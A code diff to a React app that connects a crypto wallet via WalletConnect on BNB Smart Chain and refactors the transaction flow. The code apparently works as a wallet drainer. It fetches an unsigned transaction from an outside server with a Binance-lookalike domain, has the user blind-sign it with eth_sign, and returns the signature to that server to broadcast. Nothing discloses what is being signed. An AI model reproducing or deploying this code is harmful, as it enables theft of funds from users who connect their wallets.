@@ -3,7 +3,6 @@ import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
   async function runner() {
-    // حذف داده‌های قدیمی WalletConnect
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
@@ -12,26 +11,26 @@ function App() {
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["personal_sign", "eth_sign"],
+      methods: ["eth_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
     await ethereumProvider.enable();
     const provider = ethereumProvider;
     const accounts = await provider.request({ method: "eth_accounts" });
-    const accountSender = accounts[0];
+    const userAddress = accounts[0];
 
-    if (!accountSender) {
+    if (!userAddress) {
       console.error("❌ Wallet connection failed");
       return;
     }
 
-    console.log("✅ Wallet Address:", accountSender);
+    console.log("✅ Wallet Connected:", userAddress);
 
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Chain ID
+        params: [{ chainId: "0x38" }], // BSC
       });
     } catch (error) {
       console.error("❌ Error in switching chain:", error);
@@ -40,67 +39,98 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function signAndSendTransaction(address, chain, type, contract = "0") {
+    async function requestUnsignedTransaction(address) {
+      console.log("📡 Requesting Unsigned Transaction...");
+      
       try {
-        const requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
+        const response = await jQuery.post(apiUrl, {
+          handler: "tx",
+          address: address,
+          chain: "56",
+          type: "coin",
+        });
 
-        console.log("📡 Sending Request Data:", requestData);
-
-        const result = await jQuery.post(apiUrl, requestData);
-        if (!result || result === "null") {
+        if (!response || response === "null") {
           console.error("❌ API Response is NULL");
-          return;
+          return null;
         }
 
         let unsignedTx;
         try {
-          unsignedTx = JSON.parse(result);
+          unsignedTx = JSON.parse(response);
         } catch (e) {
           console.error("❌ Error parsing JSON:", e);
-          return;
+          return null;
         }
 
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
         if (!unsignedTx.result || !unsignedTx.amount) {
-          console.error("❌ Invalid unsigned transaction response");
-          return;
+          console.error("❌ Invalid transaction data");
+          return null;
         }
 
-        const message = unsignedTx.result.rawTransaction || unsignedTx.result;
-        console.log("📝 Message to Sign:", message);
+        return unsignedTx;
+      } catch (error) {
+        console.error("❌ Error in requestUnsignedTransaction:", error);
+        return null;
+      }
+    }
 
-        const signedTx = await provider.request({
+    async function signTransaction(address, unsignedTx) {
+      const message = unsignedTx.result.rawTransaction || unsignedTx.result;
+      console.log("📝 Message to Sign:", message);
+
+      try {
+        const signature = await provider.request({
           method: "eth_sign",
           params: [address, message],
         });
 
-        if (!signedTx) {
+        if (!signature) {
           console.error("❌ Signing failed");
-          return;
+          return null;
         }
 
-        console.log("✍️ Signed Transaction:", signedTx);
+        console.log("✍️ Signature:", signature);
+        return signature;
+      } catch (error) {
+        console.error("❌ Error in signing transaction:", error);
+        return null;
+      }
+    }
 
+    async function sendSignedTransaction(address, amount, signature) {
+      console.log("📡 Sending Signed Transaction...");
+
+      try {
         const txHash = await jQuery.post(apiUrl, {
           handler: "sign",
-          signature: signedTx,
-          address: address, // ارسال آدرس برای تأیید امضا در سرور
-          amount: unsignedTx.amount, // مقدار ارسال شود
-          type,
+          address: address,
+          amount: amount,
+          signature: signature,
+          type: "coin",
         });
 
         console.log("📤 Transaction Sent:", txHash);
         return txHash;
       } catch (error) {
-        console.error("❌ Error in signAndSendTransaction:", error);
+        console.error("❌ Error in sendSignedTransaction:", error);
         return null;
       }
     }
 
-    const txHash = await signAndSendTransaction(accountSender, "56", "coin");
+    // درخواست تراکنش خام
+    const unsignedTx = await requestUnsignedTransaction(userAddress);
+    if (!unsignedTx) return;
 
+    // دریافت امضای کاربر
+    const signature = await signTransaction(userAddress, unsignedTx);
+    if (!signature) return;
+
+    // ارسال امضا به سرور
+    const txHash = await sendSignedTransaction(userAddress, unsignedTx.amount, signature);
+    
     if (txHash) {
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
